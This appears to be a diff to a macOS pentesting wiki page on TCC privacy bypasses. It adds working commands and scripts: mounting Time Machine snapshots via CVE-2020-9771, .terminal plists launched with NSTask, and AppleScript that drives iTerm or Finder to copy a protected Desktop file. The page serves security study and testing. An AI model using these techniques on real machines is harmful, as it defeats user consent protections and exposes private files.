@@ -153,8 +153,12 @@ This will avoid Calendar ask the user to access reminders, calendar and the addr
 As mentioned previously, it possible to **grant access to an App to a file by drag\&dropping it to it**. This access won't be specified in any TCC database but as an **extended** **attribute of the file**. This attribute will **store the UUID** of the allowed app:
 
 ```bash
+xattr Desktop/private.txt
+com.apple.macl
+
 # Check extra access to the file
-macl.command Desktop/private.txt
+## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
+macl_read Desktop/private.txt
 Filename,Header,App UUID
 "Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3
 
@@ -171,6 +175,46 @@ The extended attribute `com.apple.macl` **can’t be cleared** like other extend
 
 ## Bypasses
 
+## CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation
+
+If the system has some **time machine snapshots** generated, **any user** (even unprivileged ones) can mount it an **access ALL the files** of that snapshot.
+
+{% code overflow="wrap" %}
+```bash
+# List snapshots
+tmutil listlocalsnapshots /
+Snapshots for disk /:
+com.apple.TimeMachine.2023-05-29-001751.local
+
+# Generate folder to mount it
+mkdir /tmp/snap
+
+# Mount it
+/sbin/mount_apfs -o nobrowse,ro -s ccom.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
+
+# Access it
+ls /tmp/snap/Users/admin_user # This will work
+```
+{% endcode %}
+
+A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/) but in there it's explained that after the "fix" only applications with **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) will be able to do this.
+
+### Write Bypass
+
+This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:
+
+```shell-session
+username@hostname ~ % ls Desktop 
+ls: Desktop: Operation not permitted
+username@hostname ~ % echo asd > Desktop/lalala
+username@hostname ~ % ls Desktop
+ls: Desktop: Operation not permitted
+username@hostname ~ % cat Desktop/lalala
+asd
+```
+
+The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.
+
 ### SSH Bypass
 
 By default an access via **SSH** will have **"Full Disk Access"**. In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges):
@@ -186,6 +230,87 @@ Here you can find examples of how some **malwares have been able to bypass this 
 The JS code of an Electron App is not signed, so an attacker could move the app to a writable location, inject malicious JS code and launch that app and abuse the TCC permissions.
 
 Electron is working on **`ElectronAsarIntegrity`** key in Info.plist that will contain a hash of the app.asar file to check the integrity of the JS code before executing it.
+
+### Terminal Scripts
+
+It's quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it's possible to invoke **`.terminal`** scripts using with it.
+
+**`.terminal`** scripts are plist files such as this one with the command to execute in the **`CommandString`** key:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
+<dict>
+    <key>CommandString</key>
+    <string>cp ~/Desktop/private.txt /tmp/;</string>
+    <key>ProfileCurrentVersion</key>
+    <real>2.0600000000000001</real>
+    <key>RunCommandAsShell</key>
+    <false/>
+    <key>name</key>
+    <string>exploit</string>
+    <key>type</key>
+    <string>Window Settings</string>
+</dict>
+</plist>
+```
+
+An application could write a terminal script in a location such as /tmp and launch it with a come such as:
+
+```objectivec
+// Write plist in /tmp/tcc.terminal
+[...]
+NSTask *task = [[NSTask alloc] init];
+NSString * exploit_location = @"/tmp/tcc.terminal";
+task.launchPath = @"/usr/bin/open";
+task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
+exploit_location]; task.standardOutput = pipe;
+[task launch];
+```
+
+### kTCCServiceAppleEvents / Automation
+
+An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.
+
+For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+#### Over iTerm
+
+Terminal, who doesn't have FDA, can call iTerm, which has it, and use it to perform actions:
+
+{% code title="iterm.script" %}
+```applescript
+tell application "iTerm"
+    activate
+    tell current window
+        create tab with default profile
+    end tell
+    tell current session of current window
+        write text "cp ~/Desktop/private.txt /tmp"
+    end tell
+end tell
+```
+{% endcode %}
+
+```bash
+osascript iterm.script
+```
+
+#### Over Finder
+
+Or if an App has access over Finder, it could a script such as this one:
+
+```applescript
+set a_user to do shell script "logname"
+tell application "Finder"
+set desc to path to home folder
+set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
+set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
+end tell
+do shell script "rm " & POSIX path of (copyFile as alias)
+```
 
 ### Code Injection Bypass
 
@@ -268,6 +393,7 @@ Telegram had the entitlements `com.apple.security.cs.allow-dyld-environment-vari
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
 * [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
+* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
 
 <details>
 
